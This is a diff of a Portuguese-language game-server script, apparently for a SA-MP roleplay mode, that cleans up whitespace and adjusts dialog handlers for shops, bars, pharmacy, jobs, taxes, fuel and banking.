-    					SetPlayerHealthEx(playerid, 6, 1);
+    					SetPlayerHealthEx(playerid, 6, HEALTH_ADD);
 					}
-                    
+
 				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_SANDE);
 					bInfo[bID][Bank] += PRECO_COMIDA_SANDE;
-					
+
 					format(string, sizeof(string), "Comeste uma sande por %d$", PRECO_COMIDA_SANDE);
 					SendClientMessage(playerid, COLOR_INFO, string);
 	            }
@@ -3421,8 +3408,8 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 			if(bInfo[bID][Type] != BTYPE_BAR) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num Bar");
 			if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
-			
-			ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
+
+			ApplyDynamicActorAnimation(BizActor[bID], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
 
 	        switch(listitem)
 	        {
@@ -3438,14 +3425,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 					format(string, sizeof(string), "Bebeste uma cerveja por %d$", PRECO_BEBIDA_CERVEJA);
 					SendClientMessage(playerid, COLOR_INFO, string);
-					
+
 					DrunkLevel[playerid] += 1;
 	            }
 	            case 1: // Tequilla
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_TEQUILLA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 
-					PlayerActionMessage(playerid, 15.0, "bebe uma tequilla.");
+					PlayerActionMessage(playerid, 15.0, "bebe um copo de tequilla.");
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);
 
 				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_TEQUILLA);
@@ -3453,14 +3440,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 					format(string, sizeof(string), "Bebeste uma tequilla por %d$", PRECO_BEBIDA_TEQUILLA);
 					SendClientMessage(playerid, COLOR_INFO, string);
-					
+
 					DrunkLevel[playerid] += 3;
 	            }
 	            case 2: // Vodka
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_VODKA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 
-					PlayerActionMessage(playerid, 15.0, "bebe uma vodka.");
+					PlayerActionMessage(playerid, 15.0, "bebe um copo de vodka.");
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);
 
 				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_VODKA);
@@ -3468,14 +3455,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 					format(string, sizeof(string), "Bebeste uma vodka por %d$", PRECO_BEBIDA_VODKA);
 					SendClientMessage(playerid, COLOR_INFO, string);
-					
+
 					DrunkLevel[playerid] += 3;
 	            }
 	            case 3: // Whiskey
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_WHISKEY) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 
-					PlayerActionMessage(playerid, 15.0, "bebe um whiskey.");
+					PlayerActionMessage(playerid, 15.0, "bebe um copo de whiskey.");
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);
 
 				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_WHISKEY);
@@ -3483,14 +3470,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 					format(string, sizeof(string), "Bebeste um whiskey por %d$", PRECO_BEBIDA_WHISKEY);
 					SendClientMessage(playerid, COLOR_INFO, string);
-					
+
 					DrunkLevel[playerid] += 4;
 	            }
 	            case 4: // Champagne
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_CHAMPAGNE) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 
-					PlayerActionMessage(playerid, 15.0, "bebe um champagne.");
+					PlayerActionMessage(playerid, 15.0, "bebe um copo de champagne.");
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);
 
 				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_CHAMPAGNE);
@@ -3498,14 +3485,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 					format(string, sizeof(string), "Bebeste um champagne por %d$", PRECO_BEBIDA_CHAMPAGNE);
 					SendClientMessage(playerid, COLOR_INFO, string);
-					
+
 					DrunkLevel[playerid] += 2;
 	            }
 	            case 5: // Bagaço
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_BAGACO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 
-					PlayerActionMessage(playerid, 15.0, "bebe um bagaço.");
+					PlayerActionMessage(playerid, 15.0, "bebe um copo de bagaço.");
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);
 
 				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_BAGACO);
@@ -3513,14 +3500,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 					format(string, sizeof(string), "Bebeste um bagaço por %d$", PRECO_BEBIDA_BAGACO);
 					SendClientMessage(playerid, COLOR_INFO, string);
-					
+
 					DrunkLevel[playerid] += 5;
 	            }
 	            case 6: // Vinho Tinto
 	            {
 	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_TINTO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 
-					PlayerActionMessage(playerid, 15.0, "bebe um vinho tinto.");
+					PlayerActionMessage(playerid, 15.0, "bebe um copo de vinho tinto.");
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);
 
 				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_TINTO);
@@ -3528,11 +3515,11 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 					format(string, sizeof(string), "Bebeste um vinho tinto por %d$", PRECO_BEBIDA_TINTO);
 					SendClientMessage(playerid, COLOR_INFO, string);
-					
+
 					DrunkLevel[playerid] += 2;
 	            }
 			}
-			
+
 	 		switch(DrunkLevel[playerid])
 		 	{
 		 	    case 1: { SetPlayerDrunkLevel(playerid, 500); }
@@ -3545,32 +3532,32 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		 	    case 8: { SetPlayerDrunkLevel(playerid, 5000); }
 		 	    default: { SetPlayerDrunkLevel(playerid, 50000); }
 		 	}
-		 	
+
 		 	bInfo[bID][Produtos]--;
-		 	TimerDrunk[playerid] = SetTimerEx("MenosDrunk", 30000, true, "i", playerid);
+		 	TimerDrunk[playerid] = SetPlayerTimer(playerid, "MenosDrunk", 30000, true);
 
 	        return 1;
 	    }
 		case DIALOG_LOJA_TELE:
 		{
 	        if(!response) return 1;
-	        
+
 	        new bID = GetPlayerVirtualWorld(playerid);
-	        
+
 	        if(GetPlayerMoneyEx(playerid) < PRECO_TELE) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 	        if(pObjects[playerid][Telemovel] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens um telemóvel");
-	        
-	        ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
+
+	        ApplyDynamicActorAnimation(BizActor[bID], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
 	        GivePlayerMoneyEx(playerid, -PRECO_TELE);
 
             PlayerActionMessage(playerid, 15.0, "recebe uma caixa com um telemóvel lá dentro.");
 
 	        pObjects[playerid][Telemovel] = 1;
 	        bInfo[bID][Produtos]--;
-	        
+
 	        new numero[10];
 			new rederand = random(3);
-	        
+
 	        if(pInfo[playerid][UID] > 0 && pInfo[playerid][UID] < 10) // 1 numero
 	        {
 				new n1 = random(10);
@@ -3579,7 +3566,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				new n4 = random(10);
 				new n5 = random(10);
 				new n6 = random(10);
-				
+
 				// xx123456x
 
 				switch(rederand)
@@ -3673,14 +3660,14 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					}
 				}
 	        }
-	        
+
 	        pInfo[playerid][NumeroTelemovel] = strval(numero);
 	        pInfo[playerid][Rede] = bID;
-	        
+
 	        format(string, sizeof(string), "Compraste um telemóvel da rede %s. O teu número é %d", bInfo[bID][Nome], pInfo[playerid][NumeroTelemovel]);
 
 	        SendClientMessage(playerid, COLOR_INFO, string);
-	        
+
 	        return 1;
 		}
 		case DIALOG_LOJA_STAND:
@@ -3710,7 +3697,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		case DIALOG_LOJA_ROUPA:
 		{
 		    if(!response) return 1;
-		    
+
 			switch(listitem)
 			{
 			    case 0:
@@ -3724,7 +3711,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver os acessórios.");
 	   			}
 			}
-		    
+
 		    return 1;
 		}
 		case DIALOG_LOJA_247:
@@ -3758,13 +3745,13 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	            case 0:
 	            {
 	                new aluguer[8];
-	                
+
 					switch(hInfo[hID][AluguerStatus])
 					{
 					    case 0: { aluguer = "Não"; }
 					    case 1: { aluguer = "Sim"; }
 					}
-					
+
 			    	format(string, sizeof(string), "{FF9900}    [ {00FF00}INFORMAÇÃO SOBRE A CASA {FF9900}]                  "); strcat(sdialog,string);
 			    	format(string, sizeof(string), "\n\n{FF9900}Descrição da casa: {FFFFFF}%s", hInfo[hID][Nome]); strcat(sdialog,string);
 			    	format(string, sizeof(string), "\n{FF9900}Aluguer: {FFFFFF}%s", aluguer); strcat(sdialog,string);
@@ -3789,7 +3776,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	                    hInfo[hID][AluguerStatus] = 0;
 	                }
 	                GuardarCasa(hID);
-	                
+
 	                return 1;
 	            }
 	            case 2: // preço aluguer
@@ -3811,7 +3798,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	        if(!response) return 1;
 
             new hID = GetPlayerVirtualWorld(playerid);
-            
+
 	        if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_CASA_ALUGUER, DIALOG_STYLE_INPUT, "PREÇO DO ALUGUER", "{FF0000}Preço inválido. {FFFFFF}Introduz o preço do aluguer.", "Escolher", "Sair");
 			new aluguer = strval(inputtext);
 			if(aluguer < 0) return ShowPlayerDialog(playerid, DIALOG_LOJA_ENTRADA, DIALOG_STYLE_INPUT, "PREÇO DO ALUGUER", "{FF0000}Preço inválido. {FFFFFF}Introduz o preço do aluguer.", "Escolher", "Sair");
@@ -3865,11 +3852,11 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		case DIALOG_FARMACIA:
 		{
 			if(!response) return 1;
-			
+
 			if(GetPlayerMoneyEx(playerid) < PRECO_MEDICAMENTOS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 			if(pInfo[playerid][Medicamentos] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens medicametos");
 			if(pInfo[playerid][ReceitaMedica] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Precisas de uma receita médica para comprares medicamentos");
-			
+
 			new bID = GetPlayerVirtualWorld(playerid);
 
 		    switch(listitem)
@@ -3877,39 +3864,39 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		        case 0:
 				{
 				    if(pInfo[playerid][Doenca] != 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Gripe");
-				    
+
 				    pInfo[playerid][Medicamentos] = 1;
 				    SendClientMessage(playerid, COLOR_INFO, "Compraste uma caixa de Cêgripe");
 				}
 				case 1:
 				{
 				    if(pInfo[playerid][Doenca] != 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma Infeção Urinária");
-				    
+
 				    pInfo[playerid][Medicamentos] = 2;
 				    SendClientMessage(playerid, COLOR_INFO, "Compraste uma caixa de Cran-Aid");
 				}
 				case 2:
 				{
 				    if(pInfo[playerid][Doenca] != 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Dores de Barriga");
-				    
+
 				    pInfo[playerid][Medicamentos] = 3;
 				    SendClientMessage(playerid, COLOR_INFO, "Compraste uma caixa de Tylenol");
 				}
 				case 3:
 				{
 				    if(pInfo[playerid][Doenca] != 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Tosse");
-				    
+
 				    pInfo[playerid][Medicamentos] = 4;
 				    SendClientMessage(playerid, COLOR_INFO, "Compraste uma caixa de Bisolvon");
 				}
 		    }
-		    
+
 		    GivePlayerMoneyEx(playerid, -PRECO_MEDICAMENTOS);
 		    bInfo[bID][Produtos]--;
 		    bInfo[bID][Bank] += PRECO_MEDICAMENTOS;
-		    
+
 		    PlayerActionMessage(playerid, 15.0, "compra uma caixa de medicamentos e coloca-a no bolso.");
-		    
+
 		    return 1;
 		}
 		case DIALOG_LOJA_SEGUR:
@@ -3989,10 +3976,10 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					{
 					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
 					}
-	
+
 				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[1][Nome]);
 					SendClientMessage(playerid, COLOR_CHAT, string);
-					
+
 					pInfo[playerid][Emprego] = 1;
 				}
 				case 1:
@@ -4013,7 +4000,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					{
 					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
 					}
-					
+
 				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[2][Nome]);
 					SendClientMessage(playerid, COLOR_CHAT, string);
 
@@ -4037,7 +4024,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					{
 					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
 					}
-				
+
 				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[3][Nome]);
 					SendClientMessage(playerid, COLOR_CHAT, string);
 
@@ -4061,7 +4048,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					{
 					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
 					}
-				
+
 				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[4][Nome]);
 					SendClientMessage(playerid, COLOR_CHAT, string);
 
@@ -4109,7 +4096,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					{
 					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
 					}
-				
+
 				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[6][Nome]);
 					SendClientMessage(playerid, COLOR_CHAT, string);
 
@@ -4133,7 +4120,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					{
 					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
 					}
-				
+
 				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[7][Nome]);
 					SendClientMessage(playerid, COLOR_CHAT, string);
 
@@ -4157,7 +4144,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					{
 					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
 					}
-				
+
 				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[8][Nome]);
 					SendClientMessage(playerid, COLOR_CHAT, string);
 
@@ -4308,7 +4295,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 					pInfo[playerid][Emprego] = 14;
 				}
 		    }
-		    
+
 		    pInfo[playerid][Rotas] = 0;
 		    pInfo[playerid][EmpregoNivel] = 1;
 		}
@@ -4341,26 +4328,26 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		case DIALOG_IMPOSTO_GERAL:
 		{
 		    if(!response) return 1;
-		    
+
 		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_GERAL, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO GERAL", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto geral.", "Escolher", "Sair");
 		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_GERAL, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO GERAL", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto geral.", "Escolher", "Sair");
 
             new montante = strval(inputtext);
-            
+
             if(montante < 0 || montante > 500) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_GERAL, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO GERAL", "{FF0000}Valor inválido (0-500). {FFFFFF}Introduz o montante para o imposto geral.", "Escolher", "Sair");
-		    
+
 			oInfo[0][Impostos] = montante;
 			GuardarOutros();
 
 			format(string, sizeof(string), "Alteraste os impostos para %d$.", montante);
 			SendClientMessage(playerid, COLOR_INFO, string);
-		    
+
 		    return 1;
 		}
 		case DIALOG_TT:
 		{
 		    AfterTutorial(playerid);
-		    
+
 		    return 1;
 		}
 		case DIALOG_IMPOSTO_CARRO:
@@ -4407,7 +4394,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_LOJA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE NEGÓCIOS", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto sobre negócios.", "Escolher", "Sair");
 		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_LOJA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE NEGÓCIOS", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto sobre negócios.", "Escolher", "Sair");
-		    
+
             new montante = strval(inputtext);
 
             if(montante < 0 || montante > 100) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_LOJA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE NEGÓCIOS", "{FF0000}Valor inválido (0-100). {FFFFFF}Introduz o montante para o imposto sobre negócios.", "Escolher", "Sair");
@@ -4423,10 +4410,10 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		case DIALOG_ATESTAR:
 		{
 		    if(!response) return 1;
-		    
+
 		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", "{FF0000}Valor inválido. {FFFFFF}Introduz quantos litros queres atestar.", "Escolher", "Sair");
 		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", "{FF0000}Valor inválido. {FFFFFF}Introduz quantos litros queres atestar.", "Escolher", "Sair");
-		    
+
             new litros = strval(inputtext);
 
 			new gasid = IsAtGasStation(playerid);
@@ -4434,20 +4421,20 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
             if(litros <= 0 || litros > 100) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", "{FF0000}Valor inválido. {FFFFFF}Introduz quantos litros queres atestar.", "Escolher", "Sair");
 			if(litros + cInfo[car][Gasolina] > 100) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", "{FF0000}Com esse valor ultrapassas os 100L. {FFFFFF}Introduz quantos litros queres atestar.", "Escolher", "Sair");
-			
+
 			new custo = litros * oInfo[0][PrecoAtestarG];
-			
+
 			format(string, sizeof(string), "{FF0000}Não tens %d$. {FFFFFF}Introduz quantos litros queres atestar.", custo);
-			
+
 			if(GetPlayerMoneyEx(playerid) < custo) return ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", string, "Escolher", "Sair");
-			
+
             format(string, sizeof(string), "Atestaste o teu veículo com %d litros. Custo: %d$", litros, custo);
             SendClientMessage(playerid, COLOR_INFO, string);
-            
+
             GivePlayerMoneyEx(playerid, -custo);
             bInfo[gasid][Bank] += custo;
             cInfo[car][Gasolina] += litros;
-            
+
 			for(new i = 0; i < MAX_FACTIONS; i++)
 			{
 			    if(fInfo[i][Type] != F_GOVERNO) continue;
@@ -4455,15 +4442,15 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			    fInfo[i][Bank] += custo;
 				break;
 			}
-            
+
             PlayerActionMessage(playerid, 15.0, "atesta o seu veículo.");
-            
+
             return 1;
 		}
 		case DIALOG_BANCO_MENU:
 		{
 		    if(!response) return 1;
-		    
+
 			switch(listitem)
 			{
 				case 0:
@@ -4478,7 +4465,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				{
 				    format(string, sizeof(string), "[BANCO:] {FFFFFF}Montante no banco: %d$", pInfo[playerid][Bank]);
 				    SendClientMessage(playerid, COLOR_CHAT, string);
-				    
+
 				    PlayerActionMessage(playerid, 15.0, "recebe um papel com informação bancária.");
 				}
 				case 3:
@@ -4493,10 +4480,10 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				{
 				    if(pInfo[playerid][LicPesca] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma Licença de Pesca");
 				    if(GetPlayerMoneyEx(playerid) < PRECO_LICPESCA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-				    
+
 				    GivePlayerMoneyEx(playerid, -PRECO_LICPESCA);
 				    pInfo[playerid][LicPesca] = 1;
-				    
+
 		 			SendClientMessage(playerid, COLOR_INFO, "Compraste uma licença de pesca");
 
 					PlayerActionMessage(playerid, 15.0, "recebe um talão com a sua licença de pescador.");
@@ -4517,7 +4504,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
                     return ShowPlayerDialog(playerid, DIALOG_BANCO_MENU_F, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR", "{FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair"); // Depositar
 				}
 			}
-			
+
 			return 1;
 		}
 		case DIALOG_BANCO_MENU_F:
@@ -4554,12 +4541,12 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 
 			pInfo[playerid][Bank] += montante;
 			GivePlayerMoneyEx(playerid, -montante);
-			
+
    			format(string, sizeof(string), "[BANCO:] {FFFFFF}Depositaste %d$ no banco. Novo balanço: %d$", montante, pInfo[playerid][Bank]);
 		 	SendClientMessage(playerid, COLOR_CHAT, string);
-		 	
+
 			PlayerActionMessage(playerid, 15.0, "dá algum dinheiro ao banqueiro.");
-			
+
 			return 1;
 		}
 		case DIALOG_BANCO_TEL:
@@ -4587,22 +4574,22 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		case DIALOG_BANCO_EXTRAIR:
 		{
 		    if(!response) return 1;
-		    
+
   		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair"); // Extrair
 
             new montante = strval(inputtext);
-            
+
             if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair"); // Extrair
             if(pInfo[playerid][Bank] < montante) return ShowPlayerDialog(playerid, DIALOG_BANCO_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR", "{FF0000}Não tens esse dinheiro. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair"); // Extrair
 
 			pInfo[playerid][Bank] -= montante;
 			GivePlayerMoneyEx(playerid, montante);
-			
+
    			format(string, sizeof(string), "[BANCO:] {FFFFFF}Extraiste %d$ do banco. Novo balanço: %d$", montante, pInfo[playerid][Bank]);
 		 	SendClientMessage(playerid, COLOR_CHAT, string);
-		 	
+
 		 	PlayerActionMessage(playerid, 15.0, "recebe algum dinheiro do banqueiro.");
-		 	
+
 		 	return 1;
 		}
 		case DIALOG_BANCO_EXTRAIR_F:
@@ -4629,16 +4616,16 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 		case DIALOG_BANCO_TRANSF:
 		{
 		    if(!response) return 1;
-		    
+
   		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FF0000}ID inválido. {FFFFFF}Introduz a conta bancária para onde deseja transferir dinheiro. (( playerid ))", "Escolher", "Sair"); // Transferir
 
             new giveplayerid = strval(inputtext);
-            
+
             TransferirPara[playerid] = giveplayerid;
-            
+
 			if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 			if(GetPlayerScore(giveplayerid) < 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nível insuficiente");
-			
+
 			return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF2, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja transferir.", "Escolher", "Sair"); // Transferir
 		}
 		case DIALOG_BANCO_TRANSF2:
@@ -4648,36 +4635,35 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
   		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF2, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FFFFFF}Introduz o montante que deseja transferir.", "Escolher", "Sair"); // Transferir
 
             new montante = strval(inputtext);
-            
+
             if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF2, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja transferir.", "Escolher", "Sair"); // Transferir
             if(pInfo[playerid][Bank] < montante) return ShowPlayerDialog(playerid, DIALOG_BANCO_TRANSF2, DIALOG_STYLE_INPUT, "{FFFF00}TRANSFERIR", "{FF0000}Não tens esse dinheiro. {FFFFFF}Introduz o montante que deseja transferir.", "Escolher", "Sair"); // Transferir
 
 			pInfo[playerid][Bank] -= montante;
 			pInfo[TransferirPara[playerid]][Bank] += montante;
-			
+
    			format(string, sizeof(string), "[BANCO:] {FFFFFF}Transferiste %d$ para a conta bancária de: %s. Novo balanço: %d$", montante, GetPlayerNameEx(TransferirPara[playerid]), pInfo[playerid][Bank]);
 		 	SendClientMessage(playerid, COLOR_CHAT, string);
-		 	
+
    			format(string, sizeof(string), "[BANCO:] {FFFFFF}Recebeste uma transferência de %d$ do jogador %s. Novo balanço: %d$", montante, GetPlayerNameEx(playerid), pInfo[TransferirPara[playerid]][Bank]);
 		 	SendClientMessage(TransferirPara[playerid], COLOR_CHAT, string);
-		 	
+
 			PlayerActionMessage(playerid, 15.0, "clica no botão e autoriza a transferência.");
-			
+
 			TransferirPara[playerid] = 0;
-			
+
 			return 1;
 		}
 		case DIALOG_PSP_MENU:
 		{
 		    if(!response) return 1;
-		    
+
 		    switch(listitem)
 		    {
 		        case 0: // chamar agente
 		        {
           			foreach(new i : Player)
 				    {
-        				// if(!IsPlayerConnected(i)) continue;
         				if(pInfo[i][Faction] == 0) continue;
         				if(fInfo[pInfo[i][Faction]][Type] != F_POLICIA) continue;
         				if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) continue;
@@ -4691,18 +4677,17 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
